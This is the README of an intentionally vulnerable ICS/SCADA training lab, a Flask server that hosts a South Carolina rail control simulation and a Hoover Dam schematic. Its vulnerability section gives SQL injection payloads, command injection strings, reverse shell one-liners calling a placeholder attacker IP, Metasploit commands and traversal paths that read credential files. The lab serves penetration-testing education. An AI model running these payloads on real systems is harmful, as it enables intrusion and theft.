# 🚂 SC Rail Network — ICS/SCADA Training Lab

> **Industrial Control System simulation for authorized cybersecurity education and assessment training.**

[![License: MIT](https://img.shields.io/badge/License-MIT-cyan.svg)](#license)
[![Platform: Debian 12](https://img.shields.io/badge/Platform-Debian%2012-blue.svg)](#requirements)
[![Python: 3.11+](https://img.shields.io/badge/Python-3.11+-green.svg)](#requirements)
[![Offline: Yes](https://img.shields.io/badge/Offline-Capable-orange.svg)](#offline-capability)
[![MITRE ATT&CK: Mapped](https://img.shields.io/badge/MITRE%20ATT%26CK-Mapped-red.svg)](#mitre-attck-mapping)

---

## Overview

A complete ICS/SCADA training lab environment built around a realistic **South Carolina Rail Network Control System** and a **Hoover Dam 3D Structural Schematic**. Both applications are served through a Flask web server with an intentionally vulnerable authentication layer, designed as exploitation targets for classroom-based penetration testing exercises using tools like Metasploit Framework (`msfconsole`).

This project provides students with a visually compelling, functionally realistic industrial control system to practice against — rather than a sterile form with a text field. The goal is to make training scenarios feel grounded in operational technology (OT) environments that mirror real-world infrastructure.

### What's Included

| Component | Description |
|---|---|
| **SC Rail Network Control System** | Full interactive SCADA-style GUI with live train tracking, switch/bridge/signal control, and realistic physics simulation |
| **Hoover Dam 3D Wireframe** | Three.js-based rotating wireframe schematic with labeled engineering schematics — James Bond Q-branch briefing aesthetic |
| **Vulnerable Web Server** | Flask application with intentional SQL injection, command injection, directory traversal, and credential weaknesses |
| **Automated Installer** | One-command Debian 12 setup with systemd service, venv, and database initialization |
| **Instructor Guide** | Full exploitation walkthrough with msfconsole commands, MITRE ATT&CK mappings, and tiered exercise paths |

---

## SC Rail Network Control System

The centerpiece of the lab — a single-file, zero-dependency HTML application (~1,600 lines) that simulates a SCADA-style rail network control interface for the state of South Carolina.

### Features

#### Interactive Map

- **25 cities** across South Carolina plotted on a stylized SVG map with state outline
- **28 track segments** with real-world mileage between stations (sourced from SC DOT rail maps)
- **3 rail operators** color-coded: CSX Transportation (blue), Norfolk Southern (green), Palmetto Railways (purple)
- Pan (click-drag), zoom (scroll wheel), and animated zoom-to-target when selecting any infrastructure element
- Mileage labels displayed on each track segment
- Latitude/longitude coordinate readout tracking mouse position across the map

#### Realistic Train Simulation

- **10 active trains** — 7 freight services (CSX, NS, Palmetto) and 3 Amtrak passenger services
- **Physics-based movement** — each train's speed (25–60 mph) is calculated against real segment mileage
  - A 35 mph freight train on the 40-mile Columbia → Newberry segment takes ~69 minutes of sim-time
  - An Amtrak service at 60 mph covers the same 40-mile segment in ~40 minutes
- **Realistic operational behaviors**
  - Station stops at junctions (2–8 min dwell time)
  - End-of-route turnaround delays (15–45 min)
  - Random operational holds: track maintenance, grade crossing delays, crew changes, freight loading, speed restriction zones, track inspections
- Trains obey red signals and halt before open (raised/rotated) bridges
- Animated pulse rings on moving trains, blinking stop indicators on held trains
- Per-train control panel showing: current segment, mile marker within segment, ETA to next station, total miles traveled, full route display with current-position highlight

#### Switching Stations (10 Switches)

Located at all major junctions: Columbia, Florence, Greenville, Spartanburg, Charleston, Orangeburg, Kingstree, Aiken, Rock Hill, Sumter.

| Control | Description |
|---|---|
| Toggle Normal/Diverging | Switches between main and diverging track alignment |
| Lock Switch | Locks switch in current position to prevent remote changes |
| Emergency Override | Forces switch to NORMAL position with alert |

Visual diamond indicator on map — green for normal, amber for diverging — with glow effect.

#### Bridge Control (8 Bridges)

Each bridge is one of two mechanically distinct types with animated state transitions:

**Swing Bridges (4)** — Cooper River, Wateree River, Pee Dee River, Edisto River

- Rotating center span animated around a visible pivot point
- Fixed abutments remain stationary on both sides while the deck rotates through 90°
- Truss members and pivot indicator dot with glow effect visible during rotation

**Bascule Bridges (4)** — Congaree River, Broad River, Savannah River, Santee River

- Hinged leaf tilts upward to 70° from a pier-mounted hinge point
- Counterweight element becomes visible as the leaf raises
- Truss diagonal members rendered on the leaf structure

**Operating Sequence** (realistic for both types):

```
OPEN:   Sound Horn → Lower Traffic Gates → Release Lock Pins → Move Span
CLOSE:  Return Span → Engage Lock Pins → Raise Gates → Silence Horn
```

**Bridge Control Panel:**

| Control | Description |
|---|---|
| Open Bridge | Initiates full opening sequence (only when fully closed) |
| Close Bridge | Initiates closing sequence (only when fully open) |
| Emergency Stop Movement | Halts span mid-travel at current position |
| Emergency Force Close | Overrides state and forces immediate closing |
| Horn Test | Sounds warning horn for 3 seconds |
| Run Diagnostics | Simulated multi-point inspection (hydraulics, lock pins, motor, position sensor, alignment) |

**Real-time subsystem readout:**

- Span position percentage with animated progress bar
- Horn status (active/silent)
- Gate status (normal/lowered)
- Lock pin status (engaged/released)
- Operating sequence reference diagram

Bridges automatically set nearby signals to **RED** when opening and restore them to **GREEN** when fully closed.

#### Signal Control (16 Signals)

- Three-aspect signaling: **GREEN** (Clear), **AMBER** (Approach), **RED** (Stop)
- Animated pulsing glow on active aspect
- Manual aspect selection via control panel buttons
- **Auto-Signal Mode** toggle — when enabled, signals automatically transition:
  - GREEN → AMBER when a train approaches within proximity
  - → RED when a bridge on the same track segment opens
  - → GREEN when the block clears
- **Lamp Test** function — cycles through RED → AMBER → GREEN → restore
- Signals placed at approach and departure points for all major junctions

#### Simulation Speed Controls

| Speed | Ratio | Use Case |
|---|---|---|
| ⏸ Pause | 0× | Freeze all movement for inspection |
| 1× | Real-time | Observe individual train behavior at actual pace |
| 5× | 5:1 | Watch trains move between nearby cities |
| 20× | 20:1 | Observe full route traversals in minutes |
| 60× | 60:1 | 1 sim-hour per real minute — daily traffic patterns |
| 300× | 300:1 | Full day of operations in ~5 minutes |

#### Event Log

- Timestamped (sim-time) log of all system events
- Color-coded by severity: cyan (info), amber (warning), red (error/emergency)
- Captures: switch toggles, bridge operations, signal changes, train holds, emergency actions, diagnostics results
- Auto-scrolling with 150-entry circular buffer

#### User Interface Layout

```
┌──────────────────────────────────────────────────────────────────┐
│  SCRN LOGO      System Online │ Network │ Alerts │ Clock        │
├──────────┬───────────────────────────────────────┬───────────────┤
│          │          [Simulation Speed Bar]        │               │
│ Active   │                                       │   Control     │
│ Trains   │            SVG MAP                    │   Panel       │
│ (list)   │   ┌──tracks──cities──bridges──┐       │               │
│          │   │   animated trains         │       │  (switches    │
│ Switches │   │   signals  switches       │       │   to context  │
│ (list)   │   │   rivers   mileage labels │       │   of selected │
│          │   └───────────────────────────┘       │   element)    │
│ Bridges  │                                       │               │
│ (list)   │       [+] [-] [⌂] zoom controls       │               │
│          │                                       │               │
│ Signals  │                                       │               │
│ (list)   │                                       │               │
│          │                                       │               │
│ Event    │                                       │               │
│ Log      │                                       │               │
├──────────┴───────────────────────────────────────┴───────────────┤
│  v2.4.1  │  LAT/LON  │  Active Trains  │  Sim Time  │  Offline  │
└──────────────────────────────────────────────────────────────────┘
```

### Track Network Topology

```
                          Dillon
                            │ 28mi
          Spartanburg ──── Florence ──── Hartsville
         /    │  30mi    / │ \   25mi    │ 35mi
      Greer   │ 55mi    / 52mi  40mi    Camden
        │     │        /    │             │ 32mi
    Greenville─┤  Kingstree  Sumter      Columbia ◄── Hub
     │    │   Rock Hill  │ 38mi    44mi / │ \
  Anderson │    │ 20mi Georgetown     /  │ 40mi
    30mi Laurens Chester            /   │  Newberry
            │ 15mi  │ 55mi        /   55mi   │ 22mi
          Clinton   └── Columbia ◄┘    │    Clinton
                        │ 40mi      Aiken     │ 15mi
                     Orangeburg    │ 30mi   Laurens
                      │ 22mi  75mi Denmark
                     Denmark    │ 18mi
                      │       N.Augusta
                   (to Aiken)
                              Charleston
                             / 48mi
                        Walterboro
                           │ 22mi
                        Yemassee
```

### Real-World Mileage Reference

| Segment | Miles | Operator | Type |
|---|---|---|---|
| Florence → Sumter | 52 | CSX | Main |
| Sumter → Columbia | 44 | CSX | Main |
| Columbia → Newberry | 40 | CSX | Main |
| Newberry → Clinton | 22 | CSX | Main |
| Clinton → Laurens | 15 | CSX | Main |
| Laurens → Greenville | 35 | CSX | Main |
| Florence → Kingstree | 40 | CSX | Main |
| Kingstree → Charleston | 68 | CSX | Main |
| Greenville → Spartanburg | 30 | NS | Main |
| Spartanburg → Rock Hill | 55 | NS | Main |
| Rock Hill → Chester | 20 | NS | Main |
| Chester → Columbia | 55 | NS | Main |
| Columbia → Orangeburg | 40 | NS | Main |
| Orangeburg → Charleston | 75 | NS | Main |
| Columbia → Aiken | 55 | NS | Secondary |
| Aiken → N. Augusta | 18 | NS | Secondary |
| Aiken → Denmark | 30 | CSX | Secondary |
| Denmark → Orangeburg | 22 | CSX | Secondary |
| Florence → Dillon | 28 | CSX | Main |
| Florence → Hartsville | 25 | CSX | Secondary |
| Hartsville → Camden | 35 | CSX | Secondary |
| Camden → Columbia | 32 | CSX | Secondary |
| Greenville → Anderson | 30 | NS | Secondary |
| Kingstree → Georgetown | 38 | CSX | Siding |
| Charleston → Walterboro | 48 | CSX | Secondary |
| Walterboro → Yemassee | 22 | CSX | Secondary |
| Greenville → Greer | 12 | NS | Secondary |
| Greer → Spartanburg | 18 | NS | Secondary |

### Train Roster

| ID | Operator | Type | Speed | Route |
|---|---|---|---|---|
| CSX-4012 | CSX | Freight | 35 mph | Dillon → Florence → Kingstree → Charleston |
| NS-9284 | Norfolk Southern | Freight | 30 mph | Greenville → Spartanburg → Rock Hill → Chester → Columbia |
| CSX-7801 | CSX | Freight | 35 mph | Charleston → Orangeburg → Columbia → Newberry → Clinton → Laurens → Greenville |
| AMT-97 | Amtrak | Passenger | 60 mph | Columbia → Sumter → Florence → Dillon |
| NS-1156 | Norfolk Southern | Freight | 30 mph | Columbia → Aiken → N. Augusta |
| CSX-3350 | CSX | Freight | 28 mph | Florence → Hartsville → Camden → Columbia |
| AMT-19 | Amtrak | Passenger | 55 mph | Charleston → Walterboro → Yemassee |
| NS-6600 | Norfolk Southern | Freight | 25 mph | Greenville → Anderson |
| CSX-8120 | CSX | Freight | 40 mph | Charleston → Kingstree → Florence |
| PLM-201 | Palmetto Railways | Freight | 30 mph | Charleston → Orangeburg → Denmark → Aiken |

---

## Hoover Dam 3D Wireframe Schematic

A Three.js-based interactive 3D wireframe model of Hoover Dam with a cinematic intelligence-briefing aesthetic. Single-file HTML, loads Three.js r128 from CDN.

### Features

- **Procedurally generated geometry** — arch-gravity dam body built from 32 curved segments with accurate taper (660 ft base → 45 ft crest)
- **10 major structural components modeled:**
  - Dam body (curved arch-gravity wall)
  - 4 intake towers (cylindrical, upstream face)
  - 2 powerhouse wings (downstream base, curved alignment)
  - 4 penstocks (curved tube geometry, 30 ft diameter)
  - 2 spillways with drum gate cylinders
  - 2 diversion tunnels (56 ft diameter)
  - Canyon walls (tapered rock geometry)
  - Lake Mead water surface (translucent disc)
  - Crest highway (US-93 road line)
- **10 projected 3D labels** with leader lines — anchored in 3D space, projected to screen coordinates, fade with camera distance, hide when behind camera
- **Interactive orbit controls**: left-drag rotate, scroll zoom, right-drag pan, full touch support
- **6 preset camera views**: Front, Side, Aerial, Downstream, Closeup, Top Down
- **Toggle controls**: Auto-rotate, X-ray mode (boosted transparency), Labels on/off, Grid on/off
- **HUD overlay**: real-time rotation/zoom readout, coordinate display, CLASSIFIED stamp, engineering specs in side panels

### Engineering Data Displayed

| Category | Data Points |
|---|---|
| Structure | 726 ft height, 1,244 ft crest, 660 ft base / 45 ft crest width |
| Power | 2,080 MW capacity, 17 Francis turbines, ~4.2 TWh annual output |
| Reservoir | 26.1M acre-ft capacity, 157,900 acres, 532 ft max depth |
| Construction | 1931–1936, 3.25M cubic yards concrete, ~21,000 workers |
| Penstocks | 30 ft diameter, steel-lined |
| Spillways | 50 ft wide, drum gates, 200,000 CFS capacity, 400 ft tunnels |
| Diversion Tunnels | 56 ft diameter, 4 tunnels, concrete-lined |

---

## Vulnerable Lab Server

The Flask web server hosting both applications behind an intentionally vulnerable authentication layer. Designed for exploitation exercises with Metasploit Framework and manual techniques.

### Architecture

```
┌─────────────────────────────────────────────────┐
│  Debian 12 Host (Target)        Port 8080       │
│                                                 │
│  /opt/scrn-lab/                                 │
│  ├── app.py              Flask application      │
│  ├── users.db            SQLite database        │
│  ├── venv/               Python virtual env     │
│  ├── templates/                                 │
│  │   ├── login.html      ← SQLi attack surface  │
│  │   ├── dashboard.html  Post-auth hub          │
│  │   ├── diagnostics.html← RCE attack surface   │
│  │   └── files.html      ← LFI attack surface   │
│  └── static/                                    │
│      ├── sc_rail_control.html                   │
│      └── hoover_dam_wireframe.html              │
│                                                 │
│  Service: scrn-lab.service (systemd)            │
└─────────────────────────────────────────────────┘
```

### Route Map

| Route | Method | Auth | Description |
|---|---|---|---|
| `/login` | GET/POST | No | Authentication page — **SQLi target** |
| `/dashboard` | GET | Yes | Application hub with system status cards |
| `/rail-control` | GET | Yes | SC Rail Network Control System |
| `/hoover-dam` | GET | Yes | Hoover Dam 3D Wireframe Schematic |
| `/diagnostics` | GET/POST | Yes | Network diagnostic tools — **Command injection target** |
| `/files` | GET | Yes | File browser — **Directory traversal target** |
| `/logout` | GET | No | Session termination |

### Default Credentials

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | admin |
| `operator` | `operator` | operator |
| `engineer` | `hoover2024` | engineer |
| `guest` | `guest` | guest |

---

## Vulnerability Documentation

### VULN 1 — SQL Injection (Authentication Bypass)

| Field | Value |
|---|---|
| **Location** | `POST /login` |
| **Parameters** | `username`, `password` |
| **Root Cause** | String concatenation in SQL query without parameterized statements |
| **Impact** | Full authentication bypass, database extraction |
| **CVSS Analog** | 9.8 Critical |

The login query uses direct string concatenation:

```python
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

**Manual exploitation:**

```
Username: ' OR 1=1--
Password: (anything)
```

Produces:

```sql
SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
```

**Additional payloads:**

```
admin'--                                                   # Bypass password for admin
' OR '1'='1                                                # Tautology variant
' UNION SELECT 1,'hacker','x','admin','Pwned','2024'--     # Union inject
```

**msfconsole — Credential brute force path:**

```
use auxiliary/scanner/http/http_login
set RHOSTS <target_ip>
set RPORT 8080
set TARGETURI /login
set AUTH_URI /login
set REQUEST_TYPE POST
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt
set USER_AS_PASS true
set STOP_ON_SUCCESS true
run
```

**SQLMap (if available in lab):**

```bash
sqlmap -u "http://<target>:8080/login" \
  --data="username=admin&password=test" \
  --method=POST --dbms=sqlite --dump
```

---

### VULN 2 — OS Command Injection (Remote Code Execution)

| Field | Value |
|---|---|
| **Location** | `POST /diagnostics` |
| **Parameter** | `target` |
| **Root Cause** | Unsanitized input passed to `subprocess.Popen(shell=True)` |
| **Impact** | Full remote code execution as server user |
| **Prerequisite** | Authenticated session (bypass login first via SQLi or creds) |
| **CVSS Analog** | 9.8 Critical |

The diagnostics page constructs shell commands without sanitization:

```python
cmd = f"ping -c 3 {target}"
subprocess.Popen(cmd, shell=True, ...)
```

**Manual exploitation (browser, post-auth):**

```
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1; whoami; uname -a
; ls -la /opt/scrn-lab/
; cat /opt/scrn-lab/app.py
```

**Reverse shell via injection:**

Attacker:

```bash
nc -lvnp 4444
```

Diagnostics target field:

```
127.0.0.1; bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Python variant:

```
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**msfconsole — Full exploitation chain:**

Step 1 — Obtain authenticated session:

```bash
curl -v -c cookies.txt \
  -d "username=admin&password=admin123" \
  http://<target>:8080/login -L
```

Step 2a — Handler + manual injection:

```
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <attacker_ip>
set LPORT 4444
run -j
```

Then inject:

```bash
curl -b cookies.txt \
  -d "tool=ping&target=127.0.0.1;bash -i >%26 /dev/tcp/<attacker_ip>/4444 0>%261" \
  http://<target>:8080/diagnostics
```

Step 2b — Web delivery (Meterpreter):

```
use exploit/multi/script/web_delivery
set TARGET 0                       # Python
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
exploit -j
# Copy the generated command, inject into diagnostics target field
```

Step 2c — Web delivery (bash):

```
use exploit/multi/script/web_delivery
set TARGET 7                       # Unix Command
set PAYLOAD cmd/unix/reverse_bash
set LHOST <attacker_ip>
set LPORT 4444
exploit -j
# Inject generated wget/curl one-liner via:  ; <paste command>
```

---

### VULN 3 — Directory Traversal (Local File Inclusion)

| Field | Value |
|---|---|
| **Location** | `GET /files?path=` |
| **Parameter** | `path` query string |
| **Root Cause** | No path sanitization before `open()` |
| **Impact** | Arbitrary file read on host filesystem |
| **Prerequisite** | Authenticated session |

**Exploitation:**

```
/files?path=../../../etc/passwd
/files?path=../../../etc/shadow
/files?path=../../../opt/scrn-lab/app.py
/files?path=../../../opt/scrn-lab/users.db
/files?path=../../../root/.bash_history
/files?path=../../../proc/self/environ
```

---

### VULN 4 — Weak / Default Credentials

All four user accounts use dictionary words or trivially guessable passwords. No account lockout policy or rate limiting is implemented. Exploitable with Hydra, Burp Intruder, or Metasploit `auxiliary/scanner/http/http_login`.

---

### VULN 5 — Information Disclosure

- **User enumeration**: Failed login returns differentiated error messages — "User not found" vs "Invalid password" — enabling username enumeration
- **SQL error echoing**: Malformed injection payloads return the full query string and Python traceback in the browser
- **Server headers**: All responses include `X-Powered-By: Flask/2.3.0 Python/3.11` and `Server: SCRN-LabServer/2.4.1`
- **Debug mode**: Flask runs with `debug=True` — Werkzeug interactive debugger potentially accessible at `/console`
- **Command echo**: The diagnostics page displays the exact shell command string that was executed

---

### VULN 6 — Missing Security Controls

- No CSRF tokens on any form
- No rate limiting on login or diagnostics
- Hardcoded `secret_key = 'SuperSecretKey123!'` in source code (enables session cookie forgery)
- No `Content-Security-Policy`, `X-Frame-Options`, or `X-Content-Type-Options` headers
- No `HttpOnly` or `Secure` flags on session cookies
- Session fixation — no session ID regeneration upon authentication

---

## MITRE ATT&CK Mapping

| Technique | ID | Lab Vulnerability |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | SQL Injection, Command Injection |
| Valid Accounts: Default Accounts | [T1078.001](https://attack.mitre.org/techniques/T1078/001/) | Weak/default credentials |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Command Injection → reverse shell |
| Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Plaintext SQLite DB, hardcoded secret key |
| Data from Information Repositories | [T1213](https://attack.mitre.org/techniques/T1213/) | Directory traversal arbitrary file read |
| Brute Force: Password Guessing | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | No rate limiting on authentication |
| System Information Discovery | [T1082](https://attack.mitre.org/techniques/T1082/) | Command injection → `uname -a`, `id`, `hostname` |
| File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083/) | Directory traversal, command injection `ls` |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) | SQL injection INSERT/UPDATE to users table |
| Indicator Removal: Clear Command History | [T1070.003](https://attack.mitre.org/techniques/T1070/003/) | Post-exploitation via RCE shell access |

---

## Suggested Exercise Flow

### 🟢 Beginner

1. Browse to `http://<target>:8080` and observe the login page
2. Attempt default credentials from the table above
3. Explore the dashboard — open the Rail Control and Hoover Dam applications
4. Interact with the Rail Control System: toggle a switch, open a bridge, change a signal
5. Attempt basic SQL injection on the login form: `' OR 1=1--`
6. Read the error messages — note what information is disclosed

### 🟡 Intermediate

1. Use `nmap -sV -p 8080 <target>` to fingerprint the service
2. Use Metasploit `auxiliary/scanner/http/http_login` to brute-force credentials
3. After login, navigate to the diagnostics page
4. Exploit command injection: `127.0.0.1; cat /etc/passwd`
5. Use directory traversal to read the application source: `../../../opt/scrn-lab/app.py`
6. Extract the SQLite database: `/files?path=../../../opt/scrn-lab/users.db`
7. Analyze the source code to discover additional vulnerability classes

### 🔴 Advanced

1. Perform full service enumeration with `nmap`, `nikto`, and `dirb`/`gobuster`
2. Bypass authentication exclusively via SQL injection without knowing any credentials
3. Chain: SQLi auth bypass → authenticated session → command injection → reverse shell
4. Use Metasploit `exploit/multi/script/web_delivery` to establish a Meterpreter session
5. Post-exploitation: enumerate the host, escalate privileges, establish persistence
6. Forge a session cookie using the hardcoded `secret_key` found via directory traversal
7. Write a comprehensive penetration test report documenting all findings per NIST SP 800-115

---

## Installation

### Requirements

- **Debian 12** (Bookworm) — tested on clean minimal install
- **Python 3.11+** (included in Debian 12)
- **Root access** for initial setup
- **Isolated network** — do not expose to untrusted network segments

### Quick Start

```bash
# Clone or extract the project
git clone https://github.com/<your-org>/scrn-lab.git
cd scrn-lab

# Run the automated setup
sudo chmod +x setup.sh
sudo ./setup.sh

# Verify the service is running
curl http://localhost:8080/login
```

The setup script handles all of the following automatically:

- System package installation (`python3`, `python3-venv`, `net-tools`, `traceroute`, `dnsutils`, `sqlite3`)
- Python virtual environment creation and Flask installation
- Application deployment to `/opt/scrn-lab/`
- SQLite database initialization with default user accounts
- systemd service creation and activation (`scrn-lab.service`)
- Helper script generation (`start.sh`, `stop.sh`, `reset-db.sh`)

### Manual Start (without systemd)

```bash
cd /opt/scrn-lab
source venv/bin/activate
python3 app.py
```

---

## Service Management

```bash
# Start / stop / restart
sudo systemctl start scrn-lab
sudo systemctl stop scrn-lab
sudo systemctl restart scrn-lab
sudo systemctl status scrn-lab

# Live log stream
journalctl -u scrn-lab -f

# Reset database to default credentials
/opt/scrn-lab/reset-db.sh

# Manual foreground run (useful for debugging)
cd /opt/scrn-lab
source venv/bin/activate
python3 app.py
```

---

## Offline Capability

Both the Rail Control and Hoover Dam applications are single-file HTML with no mandatory external dependencies at runtime. The only external references are Google Fonts imports (typography) and a Three.js CDN load (Hoover Dam only).

For **fully air-gapped** deployments:

1. **Rail Control System** — Works 100% offline. Falls back to system fonts if Google Fonts CDN is unreachable.
2. **Hoover Dam Schematic** — Requires `three.min.js` (r128). Pre-cache it for offline use:

   ```bash
   cd /opt/scrn-lab/static
   curl -o three.min.js https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js
   # Update the <script src="..."> in hoover_dam_wireframe.html to: src="./three.min.js"
   ```

3. **Flask server** — Runs entirely on localhost with zero outbound connections required.

---

## Project Structure

```
scrn-lab/
├── README.md                          ← This file
├── setup.sh                           ← Debian 12 automated installer
├── app.py                             ← Flask server with all vulnerability logic
├── templates/
│   ├── login.html                     ← Authentication page (SQLi surface)
│   ├── dashboard.html                 ← Post-auth application hub
│   ├── diagnostics.html               ← Network diagnostic tools (RCE surface)
│   └── files.html                     ← File browser (LFI surface)
├── static/
│   ├── sc_rail_control.html           ← SC Rail Network Control System
│   └── hoover_dam_wireframe.html      ← Hoover Dam 3D Wireframe Schematic
└── users.db                           ← SQLite database (created at runtime)
```

| File | Lines | Description |
|---|---|---|
| `app.py` | ~200 | Flask server — SQLi, RCE, LFI vulnerabilities, auth logic, route handlers |
| `sc_rail_control.html` | ~1,600 | Complete rail SCADA simulation with realistic physics |
| `hoover_dam_wireframe.html` | ~1,170 | Three.js 3D wireframe model with HUD and labels |
| `login.html` | ~220 | Industrial-themed authentication page |
| `dashboard.html` | ~200 | Post-auth application hub with status cards |
| `diagnostics.html` | ~150 | Network diagnostics form with terminal output |
| `files.html` | ~120 | File browser with path input field |
| `setup.sh` | ~180 | Automated Debian 12 deployment and service setup |

---

## Technology Stack

| Layer | Technology |
|---|---|
| Server | Python 3.11+ / Flask 2.3 |
| Database | SQLite 3 (single-file, serverless) |
| Process Manager | systemd |
| Rail Control UI | Vanilla HTML / CSS / JavaScript, inline SVG rendering |
| 3D Engine | Three.js r128, WebGL |
| Typography | Orbitron, Rajdhani, Share Tech Mono, Chakra Petch, Courier Prime |
| Target OS | Debian 12 (Bookworm) |

---

## Screenshots

> *The interface uses a dark industrial-control aesthetic with cyan and green accent colors, monospace instrument readouts, and animated status indicators throughout all screens.*

**Login Page** — Cinematic authentication screen with drifting grid background, CRT scanlines, corner bracket decorations, pulsing logo ring, and "AUTHORIZED PERSONNEL ONLY" warning banner. Error messages intentionally disclose database query details.

**Dashboard** — Post-auth application hub featuring four system cards (Rail Control, Hoover Dam, Network Diagnostics, File Manager) with hover glow effects, animated entry transitions, and a live system status grid.

**SC Rail Control** — Three-panel SCADA layout. Left sidebar lists all active trains, switches, bridges, and signals with color-coded status indicators. Center panel renders the full SC rail map as interactive SVG with animated train markers, bridge mechanism icons, and signal aspects. Right panel displays context-sensitive controls that change based on the selected map element.

**Hoover Dam Schematic** — Full-viewport 3D wireframe with translucent ghost-fill. HUD panels display engineering specifications. Cyan wireframe on black with scanline overlay, floating projected labels with leader lines, and preset camera view buttons. The "CLASSIFIED" stamp pulses in the top-right corner.

**Network Diagnostics** — Dropdown tool selector (ping, traceroute, nslookup, ARP, netstat) with a target input field and terminal-style output window that echoes both the shell command executed and its results.

---

## ⚠ Disclaimer

This project is **intentionally vulnerable** and designed **exclusively for authorized cybersecurity education** in isolated lab environments.

**DO NOT:**

- Deploy on production systems or networks
- Expose to the internet or any untrusted network segment
- Use against systems without explicit written authorization
- Redistribute as a weaponized tool

All vulnerabilities are deliberately introduced and documented in full for educational transparency. This project teaches defenders how attackers exploit common web application weaknesses in ICS/SCADA-adjacent systems.

---

## License

MIT License — See [LICENSE](LICENSE) for details.

Built for authorized cybersecurity training at [Higher Echelon, Inc.](https://higherechelon.com)
